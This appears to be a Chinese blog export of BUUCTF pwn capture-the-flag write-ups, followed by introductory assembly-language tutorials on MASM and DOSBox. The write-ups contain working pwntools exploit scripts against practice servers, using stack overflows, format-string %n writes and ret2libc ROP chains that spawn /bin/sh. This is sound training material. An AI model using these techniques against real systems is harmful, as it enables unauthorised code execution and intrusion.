<br><br>r=remote(&quot;node4.buuoj.cn&quot;,26622)<br>flag_addr=0x8048F0D<br>payload=B&#x27;I&#x27;*20+B&#x27;a&#x27;*4+p32(flag_addr)<br><br>r.sendline(payload)<br><br>r.interactive() <br></code></pre></td></tr></table></figure><h2 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h2><h3 id="1-解题思路-4"><a href="#1-解题思路-4" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230406203902084.png" alt="image-20230406203902084"></p><p><img src="/../images/1-10/image-20230406203930751.png" alt="image-20230406203930751"></p><p><strong>可以利用read函数制造栈溢出。</strong></p><p>在函数列表中发现调用system函数的提示</p><p><img src="/../images/1-10/image-20230406204054142.png" alt="image-20230406204054142"></p><p>果然</p><p><img src="/../images/1-10/image-20230406203837624.png" alt="image-20230406203837624"></p><p>记录该函数地址：0x400596</p><p>GDB调试出偏移地址为136字节，即0x88为栈的大小。</p><h3 id="2-Payload-3"><a href="#2-Payload-3" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,29850)<br>payload=B&#x27;a&#x27;*0x88+p64(0x400596)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-第五空间2019-决赛-PWN5-Canary绕过"><a href="#7-第五空间2019-决赛-PWN5-Canary绕过" class="headerlink" title="7.[第五空间2019 决赛]PWN5 (Canary绕过)"></a>7.[第五空间2019 决赛]PWN5 (Canary绕过)</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h3><p><img src="/../images/1-10/image-20230406212118370.png"></p><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230406210826989.png" alt="image-20230406210826989"></p><p>根据网上的解释，函数的功能是读入一个4位的随机密码，再将我们输入的密码与随机生成数比较，相同就执行system。</p><p>这里面的printf（）存在<strong>格式化字符串漏洞</strong></p><h3 id="printf（）格式化字符串漏洞"><a href="#printf（）格式化字符串漏洞" class="headerlink" title="printf（）格式化字符串漏洞"></a>printf（）格式化字符串漏洞</h3><p><img src="/../images/1-10/image-20230409172725613.png" alt="image-20230409172725613"></p><p><img src="/../images/1-10/image-20230409172805370.png" alt="image-20230409172805370"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用 “AAAA %08x %08x %8x %08x %08x %08x %08x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，即首地址偏移或者偏移量</p><p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p><p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据</p><p>首先我们要定位到我们输入的字符串在栈上的位置。</p><p>我们输入的参数是在栈上的第10个，后面可以直接利用 %10$ 定位到这个位置。<br>随机生成函数的位置是0x804c044开始的，长度为4字节,依次+1即可。</p><p>所以可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这这个地址里的内容</p><h3 id="绕过Canary保护机制"><a href="#绕过Canary保护机制" class="headerlink" title="绕过Canary保护机制"></a>绕过Canary保护机制</h3><p>先用GDB运行一下</p><p><img src="/../images/1-10/image-20230409173022608.png" alt="image-20230409173022608"></p><p>发现”AAAA“的ASCII编码“41414141”离首字节有10个字符串，故输入的字符定位在函数栈上的第10个位置，后面可以直接利用 %10$ 定位到这个位置。</p><p><img src="/../images/1-10/image-20230409180312194.png" alt="image-20230409180312194"></p><p>从主函数中能看到随机生成函数的位置是0x804C044开始的，长度为4字节,依次+1即可。</p><p>所以可以用<code>%10$,%11$,%12$,%13$</code>去定位到这4个地址，再用%n修改这这个地址里的内容，因此构造payload</p><h3 id="2-Payload-4"><a href="#2-Payload-4" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>c = remote(&quot;node4.buuoj.cn&quot;,28635)<br><br>payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)<br>payload+=B&#x27;%10$n%11$n%12$n%13$n&#x27;<br><br>c.sendline(payload)<br>c.sendline(str(0x10101010))<br>c.interactive()<br></code></pre></td></tr></table></figure><p><strong>payload分析：</strong></p><blockquote><ol><li><p><code>payload = p32(0x804c044) + p32(0x804c045) + p32(0x804c046) + p32(0x804c047)</code>：构造一个字符串，其中包含4个32位整数，分别是<code>0x804c044</code>、<code>0x804c045</code>、<code>0x804c046</code>和<code>0x804c047</code>。这些整数是用于指定格式化字符串漏洞中待写入的地址。</p></li><li><p><code>payload += b&#39;%10$n%11$n%12$n%13$n&#39;</code>：在已构造的字符串后追加一个格式化字符串，其中使用了格式化字符串的特殊格式<code>%n</code>。<code>%n</code>的作用是将前面的字符数（即已输出的字符数）写入到对应的地址中。具体来说，<code>%10$n</code>表示将已输出的字符数写入到第10个参数所指向的地址中，<code>%11$n</code>表示将已输出的字符数写入到第11个参数所指向的地址中，以此类推。</p></li></ol><p>利用格式化字符串漏洞，将已输出的字符数写入到指定的地址中。通过在payload中指定不同的地址，可以将相应的值写入到这些地址中。根据payload中的内容，第10个参数的地址将被写入<code>0x804c044</code>，第11个参数的地址将被写入<code>0x804c045</code>，以此类推。这样，当程序执行到这个payload时，它会将已输出的字符数写入到指定的地址中，实现对这些地址的写入操作从而覆盖原有的canary保护。</p></blockquote><p><img src="/../images/1-10/image-20230409181837890.png" alt="image-20230409181837890"></p><h2 id="8-ciscn-2019-c-1-libc泄露地址"><a href="#8-ciscn-2019-c-1-libc泄露地址" class="headerlink" title="8.ciscn_2019_c_1 (libc泄露地址)"></a>8.ciscn_2019_c_1 (libc泄露地址)</h2><h3 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h3><p>例行检查</p><p><img src="/../images/1-10/image-20230414204605444.png" alt="image-20230414204605444"></p><p>开启了栈不可执行，因此shellcode方法失效</p><p>用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230414202914812.png" alt="image-20230414202914812"></p><p>尝试先在GDB中运行一下，发现这是一个输入1&#x2F;2&#x2F;3来进入以下三个函数的程序</p><p><img src="/../images/1-10/image-20230414204819897.png" alt="image-20230414204819897"></p><p>进入这三个函数查看，在encrypt函数中发现gets，因此估计是一道ret2libc的题目，由于这是64位程序，寻找”pop、rdi、ret“就行</p><p><img src="/../images/1-10/image-20230530180246796.png" alt="image-20230530180246796"></p><p>使用ROPgadget寻找</p><p><img src="/../images/1-10/image-20230530174718768.png" alt="image-20230530174718768"></p><h3 id="2-Payload-5"><a href="#2-Payload-5" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&quot;./ciscn_2019_c_1&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25096</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>encrypt_addr = elf.symbols[<span class="hljs-string">&quot;encrypt&quot;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>,payload)<br>io.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br>puts_addr = u64(io.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(ret) +p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>脚本分析：</p><blockquote><ol start="4"><li><p><code>elf = ELF(&quot;./ciscn_2019_c_1&quot;)</code>：加载二进制文件<code>ciscn_2019_c_1</code>，并创建一个ELF对象，用于获取二进制文件中的符号信息。</p></li><li><p><code>puts_plt = elf.plt[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的PLT地址。</p></li><li><p><code>puts_got = elf.got[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的GOT地址。</p></li><li><p><code>pop_rdi_ret = 0x400c83</code>：设置<code>pop rdi; ret</code>指令序列的地址，该指令用于将参数加载到RDI寄存器中。</p></li><li><p><code>ret = 0x4006b9</code>：设置<code>ret</code>指令的地址，该指令用于返回函数调用。</p></li><li><p><code>encrypt_addr = elf.symbols[&quot;encrypt&quot;]</code>：从ELF对象中获取<code>encrypt</code>函数的地址。</p></li><li><p><code>main_addr = elf.symbols[&#39;main&#39;]</code>：从ELF对象中获取<code>main</code>函数的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</code>：构造payload用于触发漏洞。payload包括一些填充数据（<code>b&#39;a&#39; * (0x50 + 0x08)</code>）和ROP链。ROP链的作用是构造栈上的一系列指令序列，以实现漏洞利用的目的。具体来说，这个ROP链的作用是调用<code>puts(puts_got)</code>，将<code>puts</code>函数的真实地址泄露出来，以便后续计算libc基址。</p></li><li><p><code>io.sendlineafter(&quot;Input your choice!\n&quot;,str(1))</code>：发送字符串”1”给远程服务，用于选择相应的功能。</p></li><li><p><code>io.sendlineafter(&quot;Input your Plaintext to be encrypted\n&quot;,payload)</code>：发送payload给远程服务，用于触发漏洞。</p></li><li><p><code>io.recvuntil(b&quot;Ciphertext\n&quot;)</code>：接收远程服务发送的数据，直到遇到字符串”Ciphertext\n”。</p></li><li><p><code>io.recvuntil(b&quot;\n&quot;)</code>：接收远程服务发送的数据，直到遇到换行符。</p></li><li><p><code>puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\0&#39;))</code>：接收远程服务发送的数据，将其转换为64位整数，即<code>puts</code>函数的真实地址。</p></li><li><p><code>libc = LibcSearcher(&quot;puts&quot;,puts_addr)</code>：创建LibcSearcher对象，以便后续通过<code>puts</code>函数地址查找libc基址和其他函数地址。</p></li><li><p><code>libcbase = puts_addr - libc.dump(&#39;puts&#39;)</code>：计算libc基址。</p></li><li><p><code>system_addr = libcbase + libc.dump(&#39;system&#39;)</code>：计算<code>system</code>函数的地址。</p></li><li><p><code>str_bin_sh = libcbase + libc.dump(&#39;str_bin_sh&#39;)</code>：计算<code>&quot;/bin/sh&quot;</code>字符串的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(ret) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)</code>：构造新的payload，其中包括填充数据、ROP链和<code>/bin/sh</code>字符串地址。这个ROP链的作用是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p></li></ol></blockquote><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="(3)总结"></a>(3)总结</h3><p>通过漏洞泄露<code>puts</code>函数的真实地址，并计算出libc基址。然后，构造合适的ROP链来调用<code>system</code>函数，并传递<code>&quot;/bin/sh&quot;</code>字符串作为参数，从而获取shell权限。</p><ol><li>找到函数地址：首先，使用<code>ELF</code>模块获取目标二进制文件中函数的地址。在脚本中，通过<code>elf.plt</code>和<code>elf.got</code>来获取<code>puts</code>函数的<code>plt</code>和<code>got</code>表项的地址，以及<code>encrypt</code>和<code>main</code>函数的地址。</li><li>构造漏洞触发payload：在脚本中，通过构造一系列的字节串来构造payload。首先，用<code>b&#39;a&#39; * (0x50 + 0x08)</code>填充到缓冲区，然后利用<code>pop_rdi_ret</code>和<code>puts_got</code>地址，以及<code>puts_plt</code>函数的地址，构造ROP链。最后，使用<code>encrypt</code>函数的地址，将payload发送给目标程序。</li><li>泄露libc基址和获取系统函数地址：通过接收目标程序返回的数据，获取泄露的<code>puts</code>函数的地址。然后，使用<code>LibcSearcher</code>模块根据泄露的<code>puts</code>函数地址来搜索libc库，并计算出libc基址。最后，通过libc基址计算出<code>system</code>函数的地址和<code>/bin/sh</code>字符串的地址。</li><li>构造第二个payload：使用泄露的libc基址、<code>ret</code>指令地址、<code>pop_rdi_ret</code>指令地址和<code>/bin/sh</code>字符串地址，构造第二个payload。ROP链的顺序为：<code>ret</code>、<code>pop_rdi_ret</code>、<code>/bin/sh</code>、<code>system</code>、<code>main</code>。</li><li>发送第二个payload获取shell：将第二个payload发送给目标程序，成功获取到shell。</li></ol><h2 id="9-ciscn-2019-c-8"><a href="#9-ciscn-2019-c-8" class="headerlink" title="9.ciscn_2019_c_8"></a>9.ciscn_2019_c_8</h2><h3 id="1-解题思路-5"><a href="#1-解题思路-5" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，发现保护全开了</p><p><img src="/../images/1-10/image-20230525194900327.png" alt="image-20230525194900327"></p><p>进入IDA看一下</p><p><img src="/../images/1-10/image-20230525195520113.png" alt="image-20230525195520113">发现只需要让var[13] &#x3D; 17 就可以调用system函数了</p><p>这里需要注意：</p><blockquote><p>&#x3D;&#x3D;qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节&#x3D;&#x3D;</p></blockquote><p>所以代码的意思是要将var[13]之后的8个字节的数据赋值为17。</p><h3 id="（2）payload"><a href="#（2）payload" class="headerlink" title="（2）payload"></a>（2）payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29179</span>)<br>p.sendline(p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="10-jarvisoj-level2"><a href="#10-jarvisoj-level2" class="headerlink" title="10.jarvisoj_level2"></a>10.jarvisoj_level2</h2><h3 id="1-解题思路-6"><a href="#1-解题思路-6" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查</p><p><img src="/../images/1-10/image-20230530204940268.png" alt="image-20230530204940268"></p><p>IDA中函数很简单，</p><p>开了NX就不能用shellcode了，另外程序没有开canary（栈溢出检测）、内存地址随机化（PIE），所以用基本的ROP</p><p>找system和\bin\sh地址</p><p><img src="/../images/1-10/image-20230530211058479.png" alt="image-20230530211058479"></p><p>system_addr&#x3D;0x8048320</p><p>shell_addr&#x3D;0x804a024</p><p>buf的大小是0x88，读入的数据大小是0x100，可以溢出0x78个字节</p><h3 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28703</span>)<br>shell_addr=<span class="hljs-number">0x804a024</span><br>system_addr=<span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">8</span>)+p32(shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五、程序的编写与执行</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="五、程序的编写与执行"><a href="#五、程序的编写与执行" class="headerlink" title="五、程序的编写与执行"></a>五、程序的编写与执行</h1><p><strong>汇编语言程序写出到执行的过程：</strong> 写出源程序—&gt;对源程序进行编译连接—&gt;生成可执行文件—&gt;操作系统将其加载入内存—&gt;CPU执行程序</p><h2 id="1-源程序"><a href="#1-源程序" class="headerlink" title="1.源程序"></a>1.源程序</h2><p>源程序包括汇编语言和伪指令。<br>示例：<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/efb0bbc8ec7640f394f8969ec7121190.png" alt="在这里插入图片描述"></p><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>伪指令是给编译器看的指令，编译器根据伪指令来进行相关编译工作。</p><h4 id="1-segment与ends"><a href="#1-segment与ends" class="headerlink" title="(1) segment与ends"></a>(1) segment与ends</h4><p>作用：定义一个段。<br>segment 表示一个段的开始，ends 表示一个段的结束。</p><p>用法：</p><blockquote><p>段名 segment<br>：<br>段名 ends</p></blockquote><h4 id="2-end"><a href="#2-end" class="headerlink" title="(2) end"></a>(2) end</h4><p>作用：结束编译。<br><strong>PS：</strong> 注意区分end与ends的含义。</p><p>用法：在程序结尾处使用。</p><h4 id="3-assume"><a href="#3-assume" class="headerlink" title="(3) assume"></a>(3) assume</h4><p>作用：将段与指定的段寄存器关联起来。（即声明该段在CPU中的执行位置）</p><p>用法：在一个段的开头使用。</p><blockquote><p>assume  段寄存器:段名</p></blockquote><h4 id="4-标号"><a href="#4-标号" class="headerlink" title="(4) 标号"></a>(4) 标号</h4><p>一个标号指代了一个段地址。<br>它被编译后最终处理为一个段地址。</p><h3 id="程序与程序结构"><a href="#程序与程序结构" class="headerlink" title="程序与程序结构"></a>程序与程序结构</h3><p><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/a18ac4c6e20743bb9f68b823b86ee62d.png" alt="图4.2"></p><h3 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h3><h4 id="1-DOS中的程序运行"><a href="#1-DOS中的程序运行" class="headerlink" title="(1)DOS中的程序运行"></a>(1)DOS中的程序运行</h4><p>DOS是一个单任务的操作系统。</p><p>当要运行XXX.exe程序时，DOS程序会终止运行，CPU将控制权移交给此exe程序，程序运行完成后，会返回DOS程序继续运行，等待下一条指令的输入。</p><p>我们称这个过程为<strong>程序返回</strong></p><p>原理详见CSAPP中对于进程与线程的阐述。</p><h4 id="2-实现程序返回（中断机制）"><a href="#2-实现程序返回（中断机制）" class="headerlink" title="(2) 实现程序返回（中断机制）"></a>(2) 实现程序返回（中断机制）</h4><p>在程序末尾添加返回的程序段。</p><blockquote><p>mov ax,4c00H<br>int 21H</p></blockquote><p><strong>PS:</strong> 这是汇编指令，由CPU负责执行。</p><p>小结：<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/de516d9e4e404a4d841ce1ddfcdbf566.png" alt="表4.1"></p><h3 id="逻辑错误与语法错误"><a href="#逻辑错误与语法错误" class="headerlink" title="逻辑错误与语法错误"></a>逻辑错误与语法错误</h3><p>被编译器发现的错误是语法错误；编译后，在运行时发生的错误是逻辑错误。<br>（<strong>一个是语句错误书写，一个是缺少必要语句或者本身的逻辑问题</strong>）</p><h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2.环境配置"></a>2.环境配置</h2><blockquote><p>(1)下载Notepad++（用于编写源程序，用其他文本软件也可以）<br>(2)下载MASM,并将这几个程序与源程序文件放在一起<br>(3)在Notepad++上编写源程序并保存到上述的文件夹中</p></blockquote><h2 id="3-源程序的编译、连接与执行"><a href="#3-源程序的编译、连接与执行" class="headerlink" title="3.源程序的编译、连接与执行"></a>3.源程序的编译、连接与执行</h2><p>(1)如源程序的示例那样编写好源程序后，我们就可以将其保存为一个XXX.asm的文件，然后进入DOSBox程序，输入以下命令以打开源程序文件所在位置：</p><blockquote><p>mount c D:\StudyAssembler\MASM\ (文件所在位置)<br>C:</p></blockquote><p>如图所示：<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/5b1206afc3884188aed6e36c6b49414d.png" alt="step1："></p><p>(2)输入以下命令以编译源程序：</p><blockquote><p>masm 1.asm</p></blockquote><p>如下图所示：<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/01840e2ce7d7427cb3c6388c2ce9fae6.png" alt="在这里插入图片描述"></p><p>(3)编译完成后会生成一个1.obj对象文件，输入以下命令以连接程序：</p><blockquote><p>link 1.obj</p></blockquote><p>由于书本中的1.asm文件只有一个代码段，所以无需作其他配置，接下来一直回车直到出现命令行的出现。</p><p>如下图所示：<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/9457bf9e04a2456fb0a9b95b8f49a9f8.png" alt="在这里插入图片描述"><br>(4)输入“1.exe”运行程序，会看到一个短暂的黑屏，然后回到DOS命令行，程序运行完毕。</p><p>至此，我们完成了1.asm文件的编译、连接和运行，但是，我们并没有看到运行程序的过程。</p><p><strong>PS:</strong> </p><ul><li>XXX.com文件大小为64KB，只能有一个段。<br>  XXX.exe文件可以很大，其中一般有多个段。<br>  所以当你编写的程序中只有一个段，可以考虑使用XXX.com文件执行，可以用于伪装。</li><li>可以用“ML 1.asm”指令来编译并连接程序，并且文件后缀和文件名有时可省略，因为已默认文件位置和类型。</li><li>可以指定文件生成的位置，只需在执行文件前加上路径</li><li>Link的作用：可以将源程序分开编译，然后将它们连在一起</li><li>在命令行输入指令后加分号，可以使编译器忽略中间文件的生成，更简捷</li></ul><h2 id="4-对于DOS程序运行原理的解释"><a href="#4-对于DOS程序运行原理的解释" class="headerlink" title="4.对于DOS程序运行原理的解释"></a>4.对于DOS程序运行原理的解释</h2><blockquote><p>(1)任何通用系统都要提供shell（外壳）程序，用户使用此程序来操作计算机系统进行工作。<br>(2)DOS中有一个程序command.com，这个程序在DOS中称为命令解释器，也就是DOS系统的shell。<br>(3)DOS启动时，先完成其他重要的初始化工作，然后运行command.com，command.com运行后，执行完其他的相关任务后，在屏幕上显示出由当前盘符和当前路径组成的提示符,比如:“c:\”或“c:\windows”等，然后等待用户的输入。<br>(4)command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置CS:IP指向程序的入口。此后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示由当前盘符和当前路径组成的提示符，等待用户的输入。在DOS中，command处理各种输入:命令或要执行的程序的文件名。我们就是通过command来进行工作的。</p></blockquote><p>故汇编程序的完整执行过程为：<br>编程 (Edit) 一&gt;l.asm一&gt;编译(masm)一&gt;1.obj一&gt;连接(link)一&gt;1.exe一&gt;加载 (command) 一&gt;内存中的程序一&gt;运行(CPU)</p><h2 id="5-跟踪程序的执行"><a href="#5-跟踪程序的执行" class="headerlink" title="5.跟踪程序的执行"></a>5.跟踪程序的执行</h2><p>在源程序的汇编指令前加标号（对段命名），并在end后加上这个标号，就给程序设置了一个入口。<br>Debug利用中断指令实现对程序的跟踪。<br>CX中存放程序的长度。<br><img src="/../images/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/1ce74633aafe437480a8c67bde1d2c2f.png" alt="图4.20"><br>上图说明内存中程序存放在DS地址+10H（即256字节）处，这256字节里存放着PSP，DOS用来和程序通信。<br>故程序的物理地址为：(X+16)x16+0 (左移一格)<br>可用段地址和偏移地址：X+10H:0</p><p>Debug的执行原理：command加载Debug，Debug加载1.exe。程序结束后从1.exe中的程序返回到Debug，从Debug返回到command。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>四、使用Debug进行简单汇编指令编程</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="四、使用Debug进行简单汇编指令编程"><a href="#四、使用Debug进行简单汇编指令编程" class="headerlink" title="四、使用Debug进行简单汇编指令编程"></a>四、使用Debug进行简单汇编指令编程</h1><h2 id="1-DOSBox和Debug安装及使用"><a href="#1-DOSBox和Debug安装及使用" class="headerlink" title="1.DOSBox和Debug安装及使用"></a>1.DOSBox和Debug安装及使用</h2><p>由于目前的Windows系统不再支持Debug的直接使用，所以我们需要先安装DOSBox和Debug来进行汇编指令编程。</p><p><strong>安装</strong></p><p>安装地址网上一般都能搜到，这里只贴出：DOSBox的地址：<a href="https://www.dosbox.com/">https://www.dosbox.com</a></p><p><strong>使用</strong></p><p>点开安装后一直Next，选个你需要的磁盘位置安装（一般是D盘）就可以，安装Debug的时候需要注意Debug的文件路径。</p><ol><li>打开DOSBox后，使用“mount c Debug位置”来让DOSBox进入Debug程序运行；然后输入“C:”<br> ；最后输入“debug”就能运行了。<br> 但是每次进入DOSBox程序时都要重复输入该指令，所以我们可以打开DOSBox文件位置，找到“…Option.bat”文件，然后如图把指令挪过来：<br> <img 